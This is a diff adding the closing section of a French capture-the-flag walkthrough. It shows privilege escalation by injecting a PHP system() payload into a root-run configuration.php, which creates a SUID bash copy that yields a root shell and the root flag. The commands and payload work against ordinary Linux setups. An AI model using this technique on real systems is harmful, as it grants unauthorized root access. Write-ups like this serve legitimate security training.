@@ -982,6 +982,91 @@ Ce script devient le point central de l’escalade de privilèges, car il s’ex
 
 La suite de l’exploitation consiste donc à modifier le fichier `configuration.php`, appelé par `monitor.php`, afin d’y insérer du code et obtenir un accès root.
 
+### Exploitation
+
+L’analyse de `monitor.php` a montré que le fichier `configuration.php` est exécuté automatiquement par root et modifiable par l’utilisateur `albert`.
+
+L’objectif est donc d’y injecter directement du code afin d’exécuter une commande en tant que root.
+
+**Modification de `configuration.php`**
+
+Tu modifies directement le fichier :
+
+```bash
+nano /opt/website-monitor/config/configuration.php
+```
+
+Et tu ajoutes le payload suivant :
+
+```php
+<?php
+define('PATH', '/opt/website-monitor');
+
+system('cp /bin/bash /var/tmp/mybashroot; chown root:root /var/tmp/mybashroot; chmod 4755 /var/tmp/mybashroot;');
+?>
+```
+
+Lors de la sauvegarde, tu observes les messages suivants :
+
+- d'abord un popup 
+
+  <span style="color:red">[File on disk has changed] </span> 
+
+- suivi de :
+
+```txt
+File was modified since you opened it; continue saving?
+```
+
+Cela indique que ce fichier est modifié en continu par un processus externe.
+
+Tu confirmes la sauvegarde en répondant `Y`, ce qui permet d’injecter temporairement ton payload.
+
+**Exécution du payload**
+
+Immédiatement après la sauvegarde :
+
+- le code est exécuté par le script lancé en tant que root
+- le fichier `/var/tmp/mybashroot` est créé
+- `configuration.php` est restauré automatiquement à son état initial
+
+Ce comportement montre qu’un mécanisme réécrit le fichier en continu, mais que ton payload est exécuté précisément au moment où tu enregistres les modifications.
+
+Tu vérifies alors la présence du binaire :
+
+```bash
+ls -l /var/tmp/mybashroot
+```
+
+**Obtention du shell root**
+
+Une fois le binaire créé avec le bit SUID :
+
+```bash
+/var/tmp/mybashroot -p
+```
+
+Puis :
+
+```bash
+mybashroot-5.0# id
+uid=1000(albert) gid=1000(albert) euid=0(root) groups=1000(albert),1001(management)
+```
+
+Le shell conserve l’utilisateur `albert`, mais s’exécute avec les privilèges effectifs root (`euid=0`).
+
+Cela suffit pour exécuter des commandes avec les privilèges root, notamment pour lire le flag.
+
+### Récupération du flag
+
+```bash
+mybashroot-5.0# cat /root/root.txt
+6276xxxxxxxxxxxxxxxxxxxxxxxxc253
+```
+
+**Le flag root est récupéré avec succès, ce qui marque la fin de l’exploitation et du CTF.**
+
+
 ---
 
 
